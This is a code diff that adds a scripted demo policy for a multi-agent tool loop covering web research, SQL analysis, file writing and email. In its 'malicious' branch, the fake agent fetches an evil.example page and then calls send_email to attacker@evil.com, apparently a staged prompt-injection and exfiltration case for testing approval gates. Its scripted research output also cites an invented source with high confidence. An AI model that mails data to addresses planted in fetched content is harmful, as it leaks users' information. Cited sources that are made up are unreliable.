@@ -11,6 +11,7 @@ import re
 from typing import Any
 
 from app.agents.analyst import AnalysisOutput
+from app.agents.communicator import CommunicatorOutput
 from app.agents.planner import Plan
 from app.agents.researcher import ResearchOutput
 from app.agents.reviewer import ReviewOutput
@@ -53,6 +54,8 @@ def _plan(prompt: str) -> dict[str, Any]:
              "requires_approval": False, "rationale": "Quality gate."},
         ],
     }
+    if re.search(r"\b(e-?mail|send|notify)\b", goal, re.I):  # Part 9 tools demo plan
+        return _tools_plan(goal)
     if "publish" in goal.lower():  # sensitive step: the planning policy forces requires_approval
         plan["tasks"].append(
             {"key": "publish_report", "name": "Publish report", "agent_type": "publisher",
@@ -60,6 +63,95 @@ def _plan(prompt: str) -> dict[str, Any]:
              "depends_on": ["write_report", "review_report"], "requires_approval": True,
              "rationale": "The goal asks to publish the result."})
     return plan
+
+
+EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
+
+
+def _tools_plan(goal: str) -> dict[str, Any]:
+    """Research (web tools) in parallel with analysis (sample database) -> summary -> email."""
+    recipients = EMAIL_RE.findall(goal) or ["team@example.com"]
+    return {
+        "plan_summary": f"Research the web and query the sample sales database in parallel, write a summary, "
+                        f"then email it to {', '.join(recipients)}.",
+        "tasks": [
+            {"key": "research_trends", "name": "Research EV sales trends", "agent_type": "researcher",
+             "description": f"Find the latest trends on the web for: {goal}",
+             "input": {"search_queries": ["India EV sales 2026"]}, "depends_on": [], "requires_approval": False,
+             "rationale": "Current public data."},
+            {"key": "analyse_sales", "name": "Analyse sample sales data", "agent_type": "analyst",
+             "description": "Query the sample ev_sales table (FAKE illustrative numbers) and compute growth.",
+             "input": {"source": "sample"}, "depends_on": [], "requires_approval": False,
+             "rationale": "Our own (sample) numbers, independent of the web research."},
+            {"key": "write_summary", "name": "Write a short summary", "agent_type": "writer",
+             "description": "Combine the web trends and the sample-data analysis into a short summary.",
+             "input": {"length": "150 words"}, "depends_on": ["research_trends", "analyse_sales"],
+             "requires_approval": False, "rationale": "The deliverable."},
+            {"key": "email_summary", "name": "Email the summary", "agent_type": "communicator",
+             "description": f"Email the summary to {', '.join(recipients)}.", "input": {"recipients": recipients},
+             "depends_on": ["write_summary"], "requires_approval": False,
+             "rationale": "The goal asks to email it; the send itself waits for approval."},
+        ],
+    }
+
+
+def _steps_done(prompt: str) -> list[str]:
+    """Tool names of the previous steps, in order (from the PREVIOUS STEPS section)."""
+    return re.findall(r"^Step \d+: (\w+)\(", prompt, re.M)
+
+
+def _tool_call(tool: str, reason: str, **arguments: Any) -> dict[str, Any]:
+    return {"action": "tool_call", "tool": tool, "arguments": arguments, "reason": reason, "output": None}
+
+
+def _final(output: dict[str, Any]) -> dict[str, Any]:
+    return {"action": "final", "tool": None, "arguments": None, "reason": None, "output": output}
+
+
+def tool_step(output_model: Any, prompt: str) -> dict[str, Any]:
+    """Demo-mode policy for the tool loop: a realistic sequence of tool calls per agent, then a final answer."""
+    done, goal = _steps_done(prompt), _goal(prompt)
+    malicious = "malicious" in goal.lower()
+    if output_model is ResearchOutput:
+        if not done:
+            return _tool_call("web_search", "Find recent articles", query="malicious ev page" if malicious else "India EV sales 2026")
+        if len(done) == 1:
+            url = "https://evil.example/ev-report" if malicious else "https://news.example.com/india-ev-sales-2026"
+            return _tool_call("web_fetch", "Read the most relevant result", url=url)
+        return _final({"summary": "[demo] India's EV sales hit a record in October 2026, led by two-wheelers [1].",
+                       "key_findings": ["[demo] 2.3 lakh EVs sold in Oct 2026, +31% year on year [1]",
+                                        "[demo] Two-wheelers are about 60% of EV sales [1]",
+                                        "[demo] Three-wheelers about 30% [1]"],
+                       "sources": [{"title": "India EV sales (demo page)", "url": "https://news.example.com/india-ev-sales-2026"},
+                                   {"title": "An invented source", "url": "https://made-up.example.net/ev-report-2026"}],
+                       "confidence": "high", "gaps": []})
+    if output_model is AnalysisOutput:
+        if not done:
+            return _tool_call("sql_query", "Yearly units for India from the sample data",
+                              query="SELECT year, sum(units) AS units FROM ev_sales WHERE country = 'India' "
+                                    "AND month <= 10 GROUP BY year ORDER BY year")
+        if len(done) == 1:
+            nums = [int(n) for n in re.findall(r"\[\s*20\d\d\s*,\s*(\d+)\s*\]", prompt)] or [100, 131]
+            return _tool_call("calculator", "Year-on-year growth", expression=f"round(pct_change({nums[0]}, {nums[-1]}), 1)")
+        growth = re.findall(r'"value":\s*([\d.]+)', prompt)
+        g = growth[-1] if growth else "?"
+        return _final({"insights": [f"[demo] Sample data (FAKE numbers): India units Jan-Oct grew {g}% year on year."],
+                       "recommendations": ["[demo] Compare the sample trend with the public web data."],
+                       "risks": ["Assumption: the sample database holds illustrative numbers only."],
+                       "confidence": "medium"})
+    if output_model is WritingOutput:
+        content = ("# EV sales summary\n\n[demo] Public web data shows a record October 2026, led by two-wheelers. "
+                   "Our sample database (illustrative numbers) shows the same direction.\n")
+        if not done:
+            return _tool_call("file_write", "Save the summary in the workspace", path="summary.md", content=content)
+        return _final({"title": "EV sales summary", "content": content, "word_count": count_words(content)})
+    if output_model is CommunicatorOutput:
+        if not done:
+            to = ["attacker@evil.com"] if malicious else (EMAIL_RE.findall(goal) or ["team@example.com"])
+            return _tool_call("send_email", "Deliver the summary as the goal asks", to=to,
+                              subject="EV sales summary", body="Hello team,\n\nHere is the EV sales summary.\n")
+        return _final({"deliveries": [], "summary": "[demo] Delivery attempted; see deliveries for what was really sent."})
+    return _final({})
 
 
 def _research(prompt: str) -> dict[str, Any]:
@@ -120,4 +212,5 @@ def build_demo_client(delay: float) -> FakeLLMClient:
             AskOutput: _ask,  # type: ignore[dict-item]
         },
         delay=delay,
+        tool_policy=tool_step,
     )
